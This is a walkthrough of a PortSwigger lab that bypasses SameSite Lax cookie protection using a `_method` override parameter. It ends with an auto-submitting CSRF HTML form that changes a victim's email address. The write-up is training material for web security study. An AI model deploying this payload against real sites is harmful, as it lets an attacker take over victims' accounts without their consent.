## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/95279fa4-8814-4c6c-89c3-0315703c73ff)

## Solution :

Go to My-Account and Log In to the account with the above credentials and change your email address.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/863353df-f62d-4127-aad3-371bce3b5ac3)

Send the POST /my-account/change-email request to Burp Repeater.And Study the `POST` /my-account/change-email request and notice that this doesn't contain any unpredictable tokens so may be vulnerable to CSRF if you can bypass the `SameSite cookie` restrictions.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/edd6b56e-5907-4641-8b10-2c89080a6667)

Look at the response to your `POST /login` request. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default `Lax` restriction level.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/fb331a91-ed83-4c43-b686-b180b24d9890)

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/59ea78c9-7cca-4c22-ad7e-ff6d31d2ec33)

Recognize that this means the session cookie will be sent in cross-site `GET` requests, as long as they involve top-level navigation.

In Burp Repeater, right-click on the request and select Change request method. Burp automatically generates an equivalent GET request.And send the request. Observe that the endpoint only allows POST requests.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/27135178-95d1-4180-bd9d-659a7ab48eab)

Try overriding the method by adding the `_method` parameter to the query string:

```html
/my-account/change-email?email=foo%40web-security-academy.net&_method=POST
```

Send the request. Observe that this has been accepted by the server.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/1b0e7f74-7be1-4a11-a259-c8fd182f13cd)

Now Generating POC.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/03b1a274-8be4-4a02-99fc-a6f8fd8e891f)

Final payload-

```html

<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0aeb00ca04b3a7b2847fb45500440068.web-security-academy.net/my-account/change-email">

      <input type="hidden" name="email" value="foo33&#64;web&#45;security&#45;academy&#46;net" />

      <input type="hidden" name="&#95;method" value="POST" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/');

      document.forms[0].submit();

    </script>

  </body>

</html>

```

Store and view the exploit yourself.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/05bbc12c-cac8-4c11-b3b3-59e3f98370c9)


 Deliver the exploit to the victim to solve the lab

 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6d00cc3a-d07c-463f-9d6d-a9759085f4f7)
